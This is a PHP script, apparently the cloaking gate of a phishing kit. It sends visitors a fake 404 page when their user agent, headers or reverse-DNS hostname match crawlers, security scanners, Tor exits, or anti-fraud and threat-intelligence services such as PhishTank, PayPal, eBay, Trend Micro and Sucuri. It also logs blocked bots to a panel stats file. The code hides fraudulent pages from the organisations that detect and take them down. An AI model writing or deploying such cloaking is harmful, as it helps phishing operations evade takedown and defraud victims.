<?php

$isBota = false;

$userAgent = $_SERVER['HTTP_USER_AGENT'];
/* VERIF USER AGENT CRAWLER 2.0 */

$data = json_decode(file_get_contents('../prevents/crawler-user-agents.json'), true);

$patterns = array();

foreach($data as $entry) {

    if ($entry['pattern'] == 'NoPattern' && isset($entry['instances'])) {
        foreach ($entry['instances'] as $instance) {
            $patterns[] = '/' . preg_quote($instance, '/') . '/';
        }
    }
}

$isBota = false;

foreach ($patterns as $pattern) {
    if (preg_match($pattern, $userAgent)) {
        $isBota = true;
        break;
    }
}




/* VERIF DE LEURS ENTETE */

if (!isset($_SERVER['HTTP_ACCEPT_LANGUAGE'])) {
    $isBota = true;
}


$botKeywords = array(
    'bot',
    'crawler',
    'spider',
    'yahoo',
    'google',
    'bing',
    'msn',
    'aol',
    'duckduckbot',
    'baidu',
    'yandex',
    'antispam',
    'dalvik',
    'ubuntu',
    'whatsapp',
    'curl',
    'facebookexternalhit',
    'python',
    'censys',
    'axios',
    'slurp',
    'teoma',
    'twiceler',
    'gigabot',
    'ia_archiver',
    'semrush',
    'ahrefsbot',
    'majestic12',
    'dotbot',
    'mozscape',
    'seokicks',
    'exabot',
    'backlinkcrawler',
    'twitterbot',
    'linkedinbot',
    'pinterest',
    'instagram',
    'vkshare',
    'pingdom',
    'uptimerobot',
    'java',
    'wget',
    'phantom.js',
    'lighthouse',
    'chromium',
    'serpstat',
    'cloudflare',
    'netcraft',
    'sogou spider',
    'feedfetcher',
    'feedly',
    'simplepie',
    'nmap',
    'zgrab',
    'shodan',
    'nessus',
    'okhttp',
    'node-fetch',
    'unirest',
    'archive.org_bot',
    'adsbot-google',
    'petalbot',
    'turingos',
    'dataprovider.com',
    'facebot',
    'applebot',
    'pingomatic',
    'bitlybot',
    'flipboard',
    'discourse',
    'mediapartners-google',
    'pricepi',
    'shoppingbot',
    'httrack',
    'webcopy',
    'webcapture',
    'screaming',
    'postman',
    'pa11y',
    'lwp-trivial',
    'perl',
    'ruby',
    'go-http-client',
    'php/',
    'yisouspider',
    'muckrack',
    'test certificate info',
    'researchscan.comsys',
    'smtbot',
    'kakaobot',
    'qihoobot',
    'microsoft-office',
    'pagepeeker',
    'zoominfo',
    'tiktok',
    'mobile sdk',
    'appengine-google',
    'apache-httpclient',
    'restsharp',
    'urlgrabber',
    'feedparser',
    'universalfeedparser',
    'rogerbot',
    'semrushbot',
    'mj12bot',
    'ahrefsbot',
    'netresearch',
    'netvibes',
    'brandwatch',
    'panscient',
    'isspider',
    'python-urllib',
    'seoscanners',
    'scrapy',
    'snacktory',
    'zmeu',
    'sqlmap',

);

foreach ($botKeywords as $keyword) {
    if (stripos($userAgent, $keyword) !== false || $userAgent == null) {
        $isBota = true;
        break;
    }
}


$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$blocked_words = array(
    "above",
    "google",
    "softlayer",
    "amazonaws",
    "cyveillance",
    "phishtank",
    "dreamhost",
    "netpilot",
    "calyxinstitute",
    "tor-exit",
    "msnbot",
    "p3pwgdsn",
    "netcraft",
    "trendmicro",
    "ebay",
    "paypal",
    "torservers",
    "messagelabs",
    "sucuri.net",
    "crawler"
);


foreach ($blocked_words as $word) {
    if (stripos($hostname, $word) !== false) {
        $isBota = true;
        break;
    }
}


if($isBota)
{
    $file = 'Panel/stats/stats.ini';
    $data = @parse_ini_file($file);
    $data['bots']++;
    update_ini($data, $file);
    http_response_code(404);

    // Affichez une page 404 personnalisée si vous le souhaitez
    echo '<!DOCTYPE html>
    <html lang="en">

    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>404 Not Found</title>
        <style>
            body {
                font-family: Arial, sans-serif;
                background-color: #f4f4f4;
                color: #333;
                margin: 0;
                display: flex;
                height: 100vh;
                justify-content: center;
                align-items: center;
            }

            .container {
                text-align: center;
                background: #fff;
                padding: 50px;
                box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
                border-radius: 5px;
            }

            h1 {
                font-size: 5em;
                margin-bottom: 20px;
                color: #ff5252;
            }

            p {
                font-size: 1.5em;
            }

            a {
                display: inline-block;
                margin-top: 20px;
                padding: 10px 20px;
                background-color: #ff5252;
                color: #fff;
                text-decoration: none;
                border-radius: 3px;
                transition: background-color 0.2s;
            }

            a:hover {
                background-color: #e44141;
            }
        </style>
    </head>

    <body>
        <div class="container">
            <h1>404</h1>
            <p>Désolé, la page que vous recherchez existe pas.</p>
            <a href="/">Acceuil</a>
        </div>
    </body>

    </html>';

    exit;
    die('404 not found');
}
?>
